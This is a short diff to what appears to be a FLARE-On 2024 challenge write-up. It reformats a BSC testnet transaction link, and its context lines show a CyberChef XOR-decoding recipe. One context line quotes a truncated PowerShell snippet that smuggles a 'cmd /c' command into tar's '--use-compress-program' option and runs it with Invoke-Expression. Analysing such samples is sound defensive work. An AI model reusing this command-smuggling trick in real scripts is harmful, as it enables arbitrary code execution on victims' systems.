@@ -1581,7 +1581,7 @@ Set-Variable -Name command -Value ("tar -x --use-compress-program 'cmd /c echo $
 Invoke-Expression $command
 ```
 
-<https://testnet.bscscan.com/tx/0xae4711c6e9d6d8f5d00a88e1adb35595bc7d7a73130e87356e3e71e65e17f337>
+[Testnet BSCScan result](https://testnet.bscscan.com/tx/0xae4711c6e9d6d8f5d00a88e1adb35595bc7d7a73130e87356e3e71e65e17f337)
 
 [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'0f%200a%200e%2024'%7D,'Standard',false)&input=TkRFZ00yRWdOMkVnTjJJZ00yTWdOMk1nTTJRZ05HRWdOVEFnTkdVZ05XVWdOellnTkRRZ05UVWdOamNnTVRFZ05UQWdOV1VnTmpZZ01UVWdNMkVnTlRVZ00yWWdNVGNnTTJNZ00yUWdOVEVnTVRVZ05qRWdOVFVnTlRrZ05ERWdObVFnTXprZ05HVWdORElnTmpNZ05tSWdOMk1nTkRFZ01qSWdOalVnTmpBZ01HRWdObU1nTmpVZ05qTT0&oeol=CR) (`FLAREON24` -> `0F 0A 0E 24`)
 
